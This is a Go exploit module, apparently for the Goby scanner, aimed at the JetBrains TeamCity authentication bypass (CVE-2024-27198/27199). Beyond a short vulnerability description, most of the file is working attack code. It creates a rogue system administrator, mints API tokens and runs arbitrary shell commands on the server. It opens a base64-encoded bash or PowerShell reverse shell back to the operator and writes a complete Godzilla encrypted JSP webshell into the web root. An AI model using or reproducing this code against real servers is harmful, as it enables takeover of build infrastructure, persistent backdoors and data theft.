package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "JetBrains TeamCity permission bypass vulnerability (CVE-2024-27198 & CVE-2024-27199)",
    "Description": "<p>JetBrains TeamCity is a continuous integration and continuous delivery (CI/CD) server developed by JetBrains. It provides a powerful platform for automating the building, testing and deployment of software projects. TeamCity aims to simplify team collaboration and software delivery processes, improve development team efficiency and product quality.</p><p>JetBrains TeamCity has an authentication bypass vulnerability before version 2023.11.4. An attacker can use this vulnerability to bypass the authentication mechanism and directly perform administrator operations. Combined with the background function, the attacker can use this vulnerability to execute arbitrary system commands on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "JET_BRAINS-TeamCity",
    "Homepage": "https://www.jetbrains.com/teamcity/",
    "DisclosureDate": "2024-03-04",
    "PostTime": "2024-03-11",
    "Author": "2737977997@qq.com",
    "FofaQuery": "header=\"Teamcity\" || banner=\"Teamcity\" || title=\"TeamCity\" || body=\"content=\\\"TeamCity (Log in to TeamCity\"",
    "GobyQuery": "header=\"Teamcity\" || banner=\"Teamcity\" || title=\"TeamCity\" || body=\"content=\\\"TeamCity (Log in to TeamCity\"",
    "Level": "3",
    "Impact": "<p>JetBrains TeamCity has an authentication bypass vulnerability before version 2023.11.4. An attacker can use this vulnerability to bypass the authentication mechanism and directly perform administrator operations. Combined with the background function, the attacker can use this vulnerability to execute arbitrary system commands on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. The manufacturer has released a solution, please update to the latest version: <a href=\"https://www.jetbrains.com/teamcity/\">https://www.jetbrains.com/teamcity/</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. If necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://www.darkreading.com/cyberattacks-data-breaches/jetbrains-teamcity-mass-exploitation-underway-rogue-accounts-thrive"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,addUser,reverse,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test98765X.jsp",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(123); %>",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "username",
            "type": "input",
            "value": "user",
            "show": "attackType=addUser"
        },
        {
            "name": "password",
            "type": "input",
            "value": "password",
            "show": "attackType=addUser"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "Permission Bypass"
    ],
    "VulType": [
        "Command Execution",
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2024-27199",
        "CVE-2024-27198"
    ],
    "CNNVD": [
        "CNNVD-202403-297",
        "CNNVD-202403-298"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "JetBrains TeamCity 权限绕过漏洞（CVE-2024-27198 & CVE-2024-27199）",
            "Product": "JET_BRAINS-TeamCity",
            "Description": "<p>JetBrains TeamCity是一款由JetBrains开发的持续集成和持续交付（CI/CD）服务器。它提供了一个功能强大的平台，用于自动化构建、测试和部署软件项目。TeamCity旨在简化团队协作和软件交付流程，提高开发团队的效率和产品质量。<br>JetBrains TeamCity 在 2023.11.4 版本之前存在认证绕过漏洞。攻击者可以利用该漏洞绕过认证机制，直接执行管理员操作，并结合后台功能，攻击者可通过该漏洞在服务器端任意执行系统命令，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、厂商已发布解决方案，请更新到最新版本：<a href=\"https://www.jetbrains.com/teamcity/\">https://www.jetbrains.com/teamcity/</a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>3、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>JetBrains TeamCity 在 2023.11.4 版本之前存在认证绕过漏洞。攻击者可以利用该漏洞绕过认证机制，直接执行管理员操作，并结合后台功能，攻击者可通过该漏洞在服务器端任意执行系统命令，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "权限绕过",
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "JetBrains TeamCity permission bypass vulnerability (CVE-2024-27198 & CVE-2024-27199)",
            "Product": "JET_BRAINS-TeamCity",
            "Description": "<p>JetBrains TeamCity is a continuous integration and continuous delivery (CI/CD) server developed by JetBrains. It provides a powerful platform for automating the building, testing and deployment of software projects. TeamCity aims to simplify team collaboration and software delivery processes, improve development team efficiency and product quality.</p><p>JetBrains TeamCity has an authentication bypass vulnerability before version 2023.11.4. An attacker can use this vulnerability to bypass the authentication mechanism and directly perform administrator operations. Combined with the background function, the attacker can use this vulnerability to execute arbitrary system commands on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. The manufacturer has released a solution, please update to the latest version: <a href=\"https://www.jetbrains.com/teamcity/\">https://www.jetbrains.com/teamcity/</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. If necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>JetBrains TeamCity has an authentication bypass vulnerability before version 2023.11.4. An attacker can use this vulnerability to bypass the authentication mechanism and directly perform administrator operations. Combined with the background function, the attacker can use this vulnerability to execute arbitrary system commands on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution",
                "Permission Bypass"
            ],
            "Tags": [
                "Command Execution",
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10935"
}`

	compareVersionDG31829HAG := func(version string) bool {
		parts := strings.Split(version, ".")
		major, _ := strconv.Atoi(parts[0])
		minor, _ := strconv.Atoi(parts[1])
		patch, _ := strconv.Atoi(parts[2])
		if major > 2023 || (major == 2023 && minor > 11) || (major == 2023 && minor == 11 && patch >= 4) {
			return true
		}
		return false
	}

	getTeamCityVersionDG31829HAG := func(hostInfo *httpclient.FixUrl) (string, error) {
		versionRequestConfig := httpclient.NewGetRequestConfig("/hax?jsp=/app/rest/server;.jsp")
		versionRequestConfig.VerifyTls = false
		versionRequestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, versionRequestConfig)
		if err != nil {
			return "", err
		} else if matches := regexp.MustCompile(`server version="([^"]+)"`).FindStringSubmatch(resp.Utf8Html); len(matches) > 1 {
			return matches[1], nil
		}
		return "", errors.New("漏洞利用失败")
	}

	addUserDG31829HAG := func(hostInfo *httpclient.FixUrl, user, password string) (string, error) {
		addUserRequestConfig := httpclient.NewPostRequestConfig("/hax?jsp=/app/rest/users;.jsp")
		addUserRequestConfig.VerifyTls = false
		addUserRequestConfig.FollowRedirect = false
		addUserRequestConfig.Header.Store("Content-Type", "application/json")
		addUserRequestConfig.Data = `{"username": "` + user + `", "password": "` + password + `", "email": "` + user + `@example.com", "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}`
		addUserResponse, err := httpclient.DoHttpRequest(hostInfo, addUserRequestConfig)
		if err != nil {
			return "", err
		} else if matches := regexp.MustCompile(`id="(\d+)"`).FindStringSubmatch(addUserResponse.Utf8Html); len(matches) > 1 && strings.Contains(addUserResponse.Utf8Html, user) && strings.Contains(addUserResponse.Utf8Html, user+"@example.com") {
			return matches[1], nil
		} else if strings.Contains(addUserResponse.RawBody, "DuplicateUserAccountException") {
			return "", errors.New("创建的用户名已经存在请更换其他用户名")
		}
		return "", errors.New("漏洞利用失败")
	}
	judgmentSystemDG31829HAG := func(hostInfo *httpclient.FixUrl) (string, error) {
		judgmentSystemRequestConfig := httpclient.NewGetRequestConfig("/hax?jsp=/app/rest/debug/jvm/systemProperties;.jsp")
		judgmentSystemRequestConfig.VerifyTls = false
		judgmentSystemRequestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, judgmentSystemRequestConfig)
		if matches := regexp.MustCompile(`name="os.name" value="([^"]+)"`).FindStringSubmatch(resp.Utf8Html); len(matches) > 1 && err == nil {
			return matches[1], nil
		}
		return "", errors.New("漏洞利用失败")
	}

	interfaceAccessDG31829HAG := func(hostInfo *httpclient.FixUrl, requestPath, token string) (*httpclient.HttpResponse, error) {
		commandExecutionRequestConfig := httpclient.NewPostRequestConfig(requestPath)
		commandExecutionRequestConfig.VerifyTls = false
		commandExecutionRequestConfig.FollowRedirect = false
		commandExecutionRequestConfig.Header.Store("Authorization", "Bearer "+token)
		return httpclient.DoHttpRequest(hostInfo, commandExecutionRequestConfig)
	}

	getTokenDG31829HAG := func(hostInfo *httpclient.FixUrl) (string, error) {
		tokenRegexp := regexp.MustCompile(`value="([^"]+)"`)
		var id string
		for i := 1; i <= 6; i++ {
			id = strconv.Itoa(i)
			if i > 5 {
				// create user
				id, err := addUserDG31829HAG(hostInfo, goutils.RandomString(6), goutils.RandomString(6))
				if len(id) == 0 || err != nil {
					return "", err
				}
			}
			if resp, err := httpclient.DoHttpRequest(hostInfo, httpclient.NewPostRequestConfig("/hax?jsp=/app/rest/users/id:"+id+"/tokens/"+goutils.RandomHexString(6)+";.jsp")); resp != nil && len(tokenRegexp.FindStringSubmatch(resp.Utf8Html)) > 1 {
				token := tokenRegexp.FindStringSubmatch(resp.Utf8Html)[1]
				if resp, err := interfaceAccessDG31829HAG(hostInfo, "/app/rest/debug/processes", token); resp != nil && (strings.Contains(resp.RawBody, "because \"exePath\" is null") || resp.StatusCode == 500) {
					return token, err
				}
			} else if err != nil {
				return "", err
			}
		}
		return "", errors.New("漏洞利用失败")
	}

	commandFlagDG31829HAG := func(hostInfo *httpclient.FixUrl, cmd, token string) (string, error) {
		if version, err := getTeamCityVersionDG31829HAG(hostInfo); err != nil {
			return "", err
		} else if compareVersionDG31829HAG(version) {
			return "", errors.New("漏洞利用失败")
		}
		os, err := judgmentSystemDG31829HAG(hostInfo)
		if err != nil {
			return "", err
		}
		os = strings.ToLower(os)
		var requestPath string
		if strings.Contains(os, "linux") {
			requestPath = "/app/rest/debug/processes?exePath=/bin/sh&params=-c&params=" + url.QueryEscape(cmd)
		} else if strings.Contains(os, "windows") {
			requestPath = "/app/rest/debug/processes?exePath=cmd.exe&params=/c&params=" + url.QueryEscape(cmd)
		}
		if resp, err := interfaceAccessDG31829HAG(hostInfo, requestPath, token); resp != nil && resp.StatusCode == 200 {
			return resp.RawBody, nil
		} else if err != nil {
			return "", err
		}
		return "", errors.New("漏洞利用失败")
	}

	fileUploadVerificationDG31829HAG := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		fileUploadVerificationRequestConfig := httpclient.NewPostRequestConfig("/res/../" + filename)
		fileUploadVerificationRequestConfig.VerifyTls = false
		fileUploadVerificationRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, fileUploadVerificationRequestConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			for _, requestPath := range []string{`/res/../admin/diagnostic.jsp`, `/.well-known/acme-challenge/../../admin/diagnostic.jsp`, `/update/../admin/diagnostic.jsp`} {
				vulnerabilityVerificationRequestConfig := httpclient.NewGetRequestConfig(requestPath)
				vulnerabilityVerificationRequestConfig.VerifyTls = false
				vulnerabilityVerificationRequestConfig.FollowRedirect = false
				if resp, err := httpclient.DoHttpRequest(hostinfo, vulnerabilityVerificationRequestConfig); resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "Debug Logging") &&
					strings.Contains(resp.RawBody, "CPU & Memory Usage") && resp.HeaderString != nil && strings.Contains(resp.HeaderString.String(), "text/html") {
					if version, _ := getTeamCityVersionDG31829HAG(hostinfo); len(version) > 1 {
						return true
					}
				} else if err != nil {
					return false
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := stepLogs.Params["attackType"].(string)
			if attackType != "reverse" && attackType != "cmd" && attackType != "webshell" && attackType != "addUser" {
				expResult.Output = `未知的利用方式`
				return expResult
			}
			token, err := getTokenDG31829HAG(expResult.HostInfo)
			if err != nil {
				expResult.Output = err.Error()
				return expResult
			}
			if attackType == "reverse" {
				cmd := ""
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				os, err := judgmentSystemDG31829HAG(expResult.HostInfo)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				cmd = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(godclient.ReverseTCPByBash(rp))) + "}|{base64,-d}|{bash,-i}'"
				if strings.Contains(strings.ToLower(os), "windows") {
					cmd = godclient.ReverseTCPByPowershell(rp)
				}
				commandFlagDG31829HAG(expResult.HostInfo, cmd, token)
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						return expResult
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "cmd" {
				if result, err := commandFlagDG31829HAG(expResult.HostInfo, goutils.B2S(stepLogs.Params["cmd"]), token); len(result) > 0 {
					expResult.Success = true
					expResult.Output = result
				} else if err != nil {
					expResult.Output = err.Error()
				}
			} else if attackType == "webshell" {
				var cmd string
				filename := goutils.RandomHexString(6) + ".jsp"
				webshell := stepLogs.Params["webshell"].(string)
				os, err := judgmentSystemDG31829HAG(expResult.HostInfo)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				if webshell == "godzilla" {
					// 哥斯拉 pass key
					cmd = `echo '<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>' > ../webapps/ROOT/` + filename
					if strings.Contains(strings.ToLower(os), "windows") {
						cmd = `echo "<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>" > ../webapps/ROOT/` + filename
					}
				} else {
					filename = goutils.B2S(stepLogs.Params["filename"])
					cmd = `echo "` + stepLogs.Params["content"].(string) + `" > ../webapps/ROOT/` + filename
				}
				if _, err := commandFlagDG31829HAG(expResult.HostInfo, cmd, token); err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				if resp, err := fileUploadVerificationDG31829HAG(expResult.HostInfo, filename); err == nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
					expResult.Success = true
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/res/../" + filename + "\n"
					if webshell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if webshell == "godzilla" {
						expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					}
					expResult.Output += "Webshell type: jsp"
				} else {
					expResult.Success = false
				}
			} else if attackType == "addUser" {
				username := goutils.B2S(stepLogs.Params["username"])
				password := goutils.B2S(stepLogs.Params["password"])
				if resp, err := addUserDG31829HAG(expResult.HostInfo, username, password); len(resp) > 1 {
					expResult.Success = true
					expResult.Output = "username: " + username + "\npassword: " + password
				} else if err != nil {
					expResult.Output = err.Error()
				}
			}
			return expResult
		},
	))
}
